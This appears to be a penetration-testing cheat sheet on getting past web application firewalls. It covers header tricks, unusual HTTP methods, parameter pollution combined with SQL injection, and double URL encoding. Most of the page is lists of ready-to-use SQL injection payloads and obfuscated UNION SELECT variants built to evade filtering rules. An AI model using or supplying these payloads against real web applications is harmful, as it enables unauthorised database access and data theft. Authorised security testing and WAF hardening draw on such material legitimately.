# General WAF torment

Generally, a WAF bypass will be one of these three types.

1. **Pre-Processor:** the WAF skips the input validation completely
2. **Impedence Mismatch**: the WAF interprets the input differently than the server
3. **Rule set bypass**: the payload is too sneaky or futuristic for the WAF

A WAF may have certain rules to change a certain input, prevent it from being passed to the server or blocking the IP completely.  To be succesful, you must be patient and understand what you are doing, as throwing fat polyglot payloads will not work most of the time, while something painfully simple may do the trick.    
Take your time and fuzz the input intelligently, so you can figure out a bypass if you suspect a susceptible endpoint.

**Bypass methods:**

Adding new headers unfamiliar to the WAF, with their own payloads as a value.    
• X-Originating-IP   
• X-Forwarded-For   
• X-Remote-IP   
• X-Remote-Addr  
  
Maybe the WAF only looks for GET and POST requests, whereas THICCBABY as an http method may glide through.

**HTTP Parameter Pollution**  
  
Depending on the back-end system, this is often dealt with in very different ways.  For example, adding another of the same parameter with a different value, as below...

```text
/?productid=1&productid=2
```

**ASP.NET** parses it into "`productid=1,2"`  
**JSP** parses it into "`productid=1"`  
**PHP** parses it into `"productid=2"`

**Combining SQL Injection and Parameter Pollution**  
  
A legitimate SQL query like below...  


```text
?productid=select 1,2,3 from table
```

can be turned into a parameter pollution attack and divided in a number of different ways

```text
?productid=select 1&productid=2,3 from table
```

Will this be combined? Just take the first parameter's value? Just the second and third

Other than that, you can try all the various encodings, though URL and double URL will be the most succesful.   
  
_Double URL encoding example:_  
  
`1 union select 1,2,3  
 ’s’ -> %73 -> %25%37%33   
1 union %25%37%33elect 1,2,3`

's' via URL encoding becomes `%73`, which can be encoded again to create `%25%37%33`

If you really want to bypass WAFs in the current year.    
`<script>alert(x)<script>` won't work anymore.    
Neither will `' or 1=1 --`    
If it does, you are not bypassing any WAF because it is clear there has never been one implemented on the web app you are testing.  I recently found a SQL injection with a payload that really isn't very clever at all:   
  
 `' or 386958=386958 --`   
  
Your effort does not have to be herculean, just less lazy than the WAF developers.  
Here are some somewhat less common payloads to try.    


`1 or 1=1   
1' or ''='   
1" or ""="   
1' or true#   
1" or true#   
1 or true# etc.`   
  
`or '1   
|| '1   
null' || 'a'=_binary'a   
1' || 'a'=x'61   
1' && '0'=x'30   
1' %26%26 %270%27%3dx'30   
2' && 0.e1=_binary"0   
1 or 1.e1=0b1010   
' || 1 like 1   
'-'   
"-"   
' || 2 not like 1   
110 or x'30'=48   
'1'!=20   
1 or 20!='1'   
2 and 2>0   
3 || 0<1   
12 || 0b1010<0b1011   
0b11 || 0b1010x'30'   
1 or 0b1   
2121/**/||21   
111' or _binary'1   
1 or 2121   
1' or 12 rlike '1`

`%55nion(%53elect)   
union%20distinct%20select   
union%20%64istinctRO%57%20select   
union%2053elect   
%23?%0auion%20?%23?%0aselect   
%23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect   
%55nion %53eLEct   
u%6eion se%6cect   
unio%6e %73elect   
unio%6e%20%64istinc%74%20%73elect   
uni%6fn distinct%52OW s%65lect   
%75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%74`

**Normal Hex**  
`select 0x313131`   
**Hexed Bypass Version**   
`select x'313131';`   
**Binary Bypass**   
`select 0b011110100110010101101110;`   
**Bypass using functions**   
`select unhex(x'333133313331');`

  
****

